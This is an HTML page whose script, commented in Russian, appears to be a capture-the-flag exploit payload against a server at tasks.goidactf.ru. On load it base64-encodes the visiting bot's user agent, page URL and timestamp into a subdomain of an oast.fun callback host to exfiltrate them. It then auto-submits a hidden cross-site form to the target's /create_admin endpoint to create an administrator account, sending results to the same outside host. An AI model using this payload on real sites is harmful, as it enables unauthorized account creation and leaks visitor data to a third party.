<!DOCTYPE html>
<html>
<body>
<script>
// 1. Информация о боте
const botInfo = {
    userAgent: navigator.userAgent,
    location: window.location.href,
    timestamp: new Date().toISOString()
};

// 2. Отправляем инфо
const encodedInfo = btoa(JSON.stringify(botInfo));
new Image().src = "https://info-" + encodedInfo + ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";

// 3. СОЗДАЕМ ФОРМУ (не fetch!)
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://tasks.goidactf.ru:20246/create_admin';
form.target = '_blank'; // открыть в новом окне
form.style.display = 'none';

// 4. Добавляем поля
const loginInput = document.createElement('input');
loginInput.type = 'hidden';
loginInput.name = 'new_admin_login';
loginInput.value = 'form_admin_' + Date.now();
form.appendChild(loginInput);

// 5. Добавляем скрытое поле для результата (если сервер его вернет)
const resultInput = document.createElement('input');
resultInput.type = 'hidden';
resultInput.name = 'result_callback';
resultInput.value = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/capture';
form.appendChild(resultInput);

// 6. Добавляем форму на страницу и отправляем
document.body.appendChild(form);
form.submit();

// 7. Сообщаем что форма отправлена
new Image().src = "https://form-submitted.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";
</script>
</body>
</html>
